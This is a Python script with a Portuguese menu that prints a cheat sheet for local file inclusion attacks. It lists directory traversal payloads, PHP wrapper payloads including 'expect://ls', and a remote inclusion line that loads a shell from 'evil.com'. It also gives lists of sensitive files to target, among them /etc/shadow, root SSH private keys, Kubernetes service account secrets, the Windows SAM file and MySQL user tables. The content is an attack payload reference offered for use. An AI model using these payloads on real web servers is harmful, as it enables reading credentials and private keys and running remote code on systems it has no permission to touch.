# BIBLIOTESCAS
# =============================
from os import system
from time import sleep
# =============================
#
#
# Fundo do LFI


def fun_lfi():
    while True:
        system('clear')
        print("""
    ╦  ╔═╗╦
    ║  ╠╣ ║
    ╩═╝╚  ╩\n
    - LFI significa Local File Include - é uma vulnerabilidade de inclusão local de arquivo que permite que um invasor inclua arquivos que existem no servidor web de destino.
    Normalmente, isso é explorado abusando dos mecanismos de inclusão de arquivos dinâmicos que não limpam a entrada do usuário.

    [01] - Directory traversal\n
    * Arquivos LFI úteis
    [02] - Linux
    [03] - Apache
    [04] - MySQL
    [05] - Windows
    [06] - Menu
    [99] - Sair

    """)
        cmd = str(input("===> "))
        if cmd == '1':
            system('clear')
            print("""
    ╔╦╗╦╦═╗╔═╗╔═╗╔╦╗╔═╗╦═╗╦ ╦  ╔╦╗╦═╗╔═╗╦  ╦╔═╗╦═╗╔═╗╔═╗╦  
    ║║║╠╦╝║╣ ║   ║ ║ ║╠╦╝╚╦╝   ║ ╠╦╝╠═╣╚╗╔╝║╣ ╠╦╝╚═╗╠═╣║  
    ═╩╝╩╩╚═╚═╝╚═╝ ╩ ╚═╝╩╚═ ╩    ╩ ╩╚═╩ ╩ ╚╝ ╚═╝╩╚═╚═╝╩ ╩╩═╝\n

    - Payload

    foo.php?file=../../../../../../../etc/passwd

    - PHP Wrapper php://file

    > /example1.php?page=expect://ls
    > /example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
    > http://example.com/index.php?page=http://evil.com/shell.txt 
            """)
            input("[*] - Pressione ENTER para voltar...")
            fun_lfi()
            break
        elif cmd == '2':
            system('clear')
            print("""
    _ _                  
    | (_)                 
    | |_ _ __  _   ___  __
    | | | '_ \| | | \ \/ /
    | | | | | | |_| |>  < 
    |_|_|_| |_|\__,_/_/\_\ \n

    > /etc/passwd
    > /etc/shadow
    > /etc/issue
    > /etc/group
    > /etc/hostname
    > /etc/ssh/ssh_config
    > /etc/ssh/sshd_config
    > /root/.ssh/id_rsa
    > /root/.ssh/authorized_keys
    > /home/user/.ssh/authorized_keys
    > /home/user/.ssh/id_rsa
    > /proc/[0-9]*/fd/[0-9]*
    > /proc/mounts
    > /home/$USER/.bash_history
    > /home/$USER/.ssh/id_rsa
    > /var/run/secrets/kubernetes.io/serviceaccount
    > /var/lib/mlocate/mlocate.db
    > /var/lib/mlocate.db
                """)
            input("[*] - Pressione ENTER para voltar...")
            fun_lfi()
            break
        elif cmd == '3':
            system('clear')
            print("""
    ╔═╗╔═╗╔═╗╔═╗╦ ╦╔═╗  
    ╠═╣╠═╝╠═╣║  ╠═╣║╣   
    ╩ ╩╩  ╩ ╩╚═╝╩ ╩╚═╝\n

    > /etc/apache2/apache2.conf
    > /usr/local/etc/apache2/httpd.conf
    > /etc/httpd/conf/httpd.conf
    > Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log
    > Debian/Ubuntu -> /var/log/apache2/access.log
    > FreeBSD -> /var/log/httpd-access.log
    > /var/log/apache/access.log
    > /var/log/apache/error.log
    > /var/log/apache2/access.log
    > /var/log/apache/error.log
                    """)

            input("[*] - Pressione ENTER para voltar...")
            fun_lfi()
            break
        elif cmd == '4':
            system('clear')
            print("""
    ╔╦╗╦ ╦╔═╗╔═╗ ╦    
    ║║║╚╦╝╚═╗║═╬╗║    
    ╩ ╩ ╩ ╚═╝╚═╝╚╩═╝ \n

    > /var/lib/mysql/mysql/user.frm
    > /var/lib/mysql/mysql/user.MYD
    > /var/lib/mysql/mysql/user.MYI
                    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_lfi()
            break
        elif cmd == '5':
            system('clear')
            print("""
    ╦ ╦╦╔╗╔╔╦╗╔═╗╦ ╦╔═╗  
    ║║║║║║║ ║║║ ║║║║╚═╗  
    ╚╩╝╩╝╚╝═╩╝╚═╝╚╩╝╚═╝\n

    > /boot.ini
    > /autoexec.bat
    > /windows/system32/drivers/etc/hosts
    > /windows/repair/SAM
    > /windows/panther/unattended.xml
    > /windows/panther/unattend/unattended.xml
    > /windows/system32/license.rtf
    > /windows/system32/eula.txt
                    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_lfi()
            break
        elif cmd == '6':
            break
        
        elif cmd == '99':
            print('Até logo...')
            exit()
        
        else:
            print("Comando Inválido!!!")
            sleep(2)
